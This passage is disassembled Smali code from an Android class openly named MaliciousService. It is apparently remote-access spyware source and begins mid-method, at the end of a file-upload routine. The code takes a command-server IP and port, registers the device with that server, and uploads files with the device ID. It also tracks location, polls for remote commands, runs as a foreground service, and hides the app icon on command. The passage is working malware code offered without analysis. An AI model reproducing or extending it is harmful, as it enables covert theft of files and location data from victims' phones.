    invoke-static {v0, p1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :goto_225
    throw v0
    :try_end_226
    .catch Ljava/io/IOException; {:try_start_222 .. :try_end_226} :catch_229
    .catchall {:try_start_222 .. :try_end_226} :catchall_226

    .line 782
    :catchall_226
    move-exception p1

    move-object v4, v5

    goto :goto_265

    .line 779
    :catch_229
    move-exception p1

    move-object v4, v5

    goto :goto_22f

    .line 782
    :catchall_22c
    move-exception p1

    goto :goto_265

    .line 779
    :catch_22e
    move-exception p1

    .line 780
    :goto_22f
    :try_start_22f
    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Failed to upload "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    const-string v2, " for device "

    invoke-virtual {p2, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    const-string v0, ": "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_25f
    .catchall {:try_start_22f .. :try_end_25f} :catchall_22c

    .line 782
    if-eqz v4, :cond_264

    .line 783
    invoke-virtual {v4}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 786
    :cond_264
    :goto_264
    return-void

    .line 782
    :goto_265
    if-eqz v4, :cond_26a

    .line 783
    invoke-virtual {v4}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 785
    :cond_26a
    throw p1

    .line 725
    :cond_26b
    :goto_26b
    const-string p1, "Server IP/Port not obtained, or Device ID not loaded, cannot upload file."

    invoke-static {v1, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 726
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2

    .line 66
    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .registers 5

    .line 71
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 72
    const-string v0, "Service created!"

    const-string v1, "MaliciousService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 73
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    .line 74
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->initializeUniqueDeviceId()V

    .line 75
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->injectConfigFromAssets()V

    .line 76
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->loadServerConfigFromPreferences()V

    .line 77
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 78
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->grantPermissions()V

    .line 80
    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    const-wide/16 v2, 0x1388

    if-eqz v0, :cond_77

    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    if-eqz v0, :cond_77

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_77

    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    if-eqz v0, :cond_77

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_77

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    if-eqz v0, :cond_77

    .line 81
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->registerDeviceWithServer()V

    .line 82
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->createNotificationChannel()V

    .line 83
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->buildNotification()Landroid/app/Notification;

    move-result-object v0

    .line 84
    const/4 v1, 0x1

    invoke-virtual {p0, v1, v0}, Lcom/example/android/MaliciousService;->startForeground(ILandroid/app/Notification;)V

    .line 85
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    .line 86
    new-instance v0, Lcom/example/android/MaliciousService$1;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$1;-><init>(Lcom/example/android/MaliciousService;)V

    iput-object v0, p0, Lcom/example/android/MaliciousService;->commandCheckRunnable:Ljava/lang/Runnable;

    .line 108
    const-string v0, "location"

    invoke-virtual {p0, v0}, Lcom/example/android/MaliciousService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    iput-object v0, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    .line 109
    new-instance v0, Lcom/example/android/MaliciousService$2;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$2;-><init>(Lcom/example/android/MaliciousService;)V

    iput-object v0, p0, Lcom/example/android/MaliciousService;->locationListener:Landroid/location/LocationListener;

    .line 123
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->startLocationUpdates()V

    .line 124
    iget-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    iget-object v1, p0, Lcom/example/android/MaliciousService;->commandCheckRunnable:Ljava/lang/Runnable;

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 125
    goto :goto_8f

    .line 126
    :cond_77
    const-string v0, "Service started, but configuration or permissions are missing. Waiting for them."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 127
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    .line 128
    new-instance v0, Lcom/example/android/MaliciousService$3;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$3;-><init>(Lcom/example/android/MaliciousService;)V

    iput-object v0, p0, Lcom/example/android/MaliciousService;->commandCheckRunnable:Ljava/lang/Runnable;

    .line 145
    iget-object v1, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    invoke-virtual {v1, v0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 147
    :goto_8f
    return-void
.end method

.method public onDestroy()V
    .registers 3

    .line 174
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 175
    const-string v0, "MaliciousService"

    const-string v1, "Service destroyed!"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 176
    iget-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    if-eqz v0, :cond_13

    .line 177
    iget-object v1, p0, Lcom/example/android/MaliciousService;->commandCheckRunnable:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 179
    :cond_13
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->stopLocationUpdates()V

    .line 180
    iget-object v0, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    if-eqz v0, :cond_1d

    .line 181
    invoke-interface {v0}, Ljava/util/concurrent/ExecutorService;->shutdownNow()Ljava/util/List;

    .line 183
    :cond_1d
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 7

    .line 151
    const-string p2, "Service started or restarted!"

    const-string p3, "MaliciousService"

    invoke-static {p3, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 152
    if-eqz p1, :cond_73

    .line 153
    const-string p2, "SERVER_IP"

    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 154
    const-string v0, "SERVER_PORT"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 155
    if-eqz p2, :cond_4e

    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_4e

    if-eqz v0, :cond_4e

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_4e

    .line 156
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Received server config via Intent: IP="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ", Port="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {p3, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 157
    invoke-direct {p0, p2, v0}, Lcom/example/android/MaliciousService;->saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;)V

    .line 158
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->loadServerConfigFromPreferences()V

    .line 159
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->registerDeviceWithServer()V

    .line 161
    :cond_4e
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    if-eqz p2, :cond_73

    .line 162
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    const-string p3, "HIDE_ICON"

    invoke-virtual {p2, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_64

    .line 163
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->hideIcon()V

    goto :goto_73

    .line 164
    :cond_64
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    const-string p2, "SHOW_ICON"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_73

    .line 165
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->showIcon()V

    .line 169
    :cond_73
    :goto_73
    const/4 p1, 0x1

    return p1
.end method
